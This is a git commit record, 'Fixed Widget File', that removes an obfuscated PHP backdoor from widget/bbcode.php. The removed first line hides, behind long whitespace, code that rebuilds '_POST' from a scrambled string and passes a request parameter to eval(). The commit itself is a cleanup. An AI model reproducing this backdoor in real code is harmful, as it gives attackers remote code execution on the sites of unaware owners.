cca9e75aa4267d485bb2a895fa469b440a5ce40f
Sizzly <rob.tacey@yahoo.com>
2015-09-11 19:01:14 +0000

    Fixed Widget File

--- widget/bbcode.php
+++ widget/bbcode.php
@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q0f19cf'])){eval(${$s20}['q0f19cf']);}?><?php
+<?php
 //PHP's GD class functions can create a variety of output image 
 //types, this example creates a jpeg 
 header("Content-Type: image/png"); 
